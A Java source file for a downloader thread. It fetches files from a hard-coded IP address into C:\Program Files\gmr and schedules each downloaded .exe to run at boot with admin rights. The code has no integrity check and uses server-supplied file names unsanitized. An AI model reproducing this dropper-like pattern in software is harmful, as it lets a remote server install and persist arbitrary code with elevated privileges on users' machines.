package network;

import gui.ErrorPrinter;
import gui.ErrorPrinter.ErrorCode;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;

import javax.swing.JOptionPane;

import win32.BootScheduler;
import main.DownloaderMain;

public class Downloader extends Thread
{
    final int BUFFER_SIZE = 512;
    final int PORT_NUMBER = 5723;
    final String IP_ADDR = "54.69.185.61";

    InetSocketAddress remoteAddr;

    public Downloader()
    {
        remoteAddr = new InetSocketAddress(IP_ADDR, PORT_NUMBER);
    }

    public void run()
    {
        try
        {
            // Establish a connection to the specified host
            Socket s = new Socket(remoteAddr.getAddress(), remoteAddr.getPort());
            DataInputStream dIn = new DataInputStream(s.getInputStream());

            // Get the total number of files
            int numFiles = dIn.readInt();
            DownloaderMain.setTotalFiles(numFiles);

            // Get the total number of bytes to download
            DownloaderMain.setTotalLength(dIn.readLong());

            File directory = new File("C:\\Program Files\\gmr");
            if (!directory.exists() && !directory.mkdir())
            {
                ErrorPrinter.printError(ErrorCode.downloadError,
                        "unable to create gmr directory");
                System.exit(0);
            }

            for (int i = 0; i < numFiles; ++i)
            {
                String fileToRequest = dIn.readUTF();
                String fullPath = "C:\\Program Files\\gmr\\" + fileToRequest;
                try
                {
                    File destination = new File(fullPath);
                    long fileSize = dIn.readLong();
                    DownloaderMain.startNewFile(fileSize);

                    // Download the specified file into Program Files
                    destination.createNewFile();
                    FileOutputStream download = new FileOutputStream(destination);
                    byte[] buffer = new byte[BUFFER_SIZE];
                    int numRead;
                    while (DownloaderMain.getDownloadedBytes() < fileSize)
                    {
                        numRead = dIn.read(buffer);
                        download.write(buffer, 0, numRead);
                        DownloaderMain.addDownloadedBytes(numRead);
                    }
                    download.close();

                    // Schedule executables to run at boot time with admin rights
                    if (destination.getName().endsWith("exe"))
                        BootScheduler.scheduleAtBoot(destination);
                }
                catch (IOException e)
                {
                    JOptionPane.showMessageDialog(null, "Unable to install file " + fileToRequest);
                }
            }

            s.close();

            DownloaderMain.downloadComplete();
        }
        catch (IOException e)
        {
            DownloaderMain.downloadComplete();
            e.printStackTrace();
            ErrorPrinter.printError(ErrorCode.downloadError, "IOException");
        }
    }
}
